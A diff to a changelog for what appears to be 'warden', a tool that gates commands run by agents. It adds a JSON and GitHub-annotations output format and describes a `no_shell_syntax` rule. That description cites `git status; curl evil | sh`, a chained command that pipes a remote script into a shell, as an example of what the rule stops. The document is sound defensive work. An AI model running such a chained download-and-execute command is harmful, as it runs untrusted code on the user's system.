@@ -26,6 +26,8 @@
   could use up an agent's or the admin's hellos, so nobody could approve while it flooded.
 
 ### Added
+- `warden check --format json|github`: the report as JSON, or as GitHub Actions
+  annotations on the pull request.
 - Condition op `no_shell_syntax` (no value): the text uses only letters, digits, spaces
   and `- _ . / : = , @ + %`. Next to `startswith "git "` it stops `git status; curl evil |
   sh`, `$(...)`, redirects, globs and quotes. [Design](docs/design/no-shell-syntax.md).
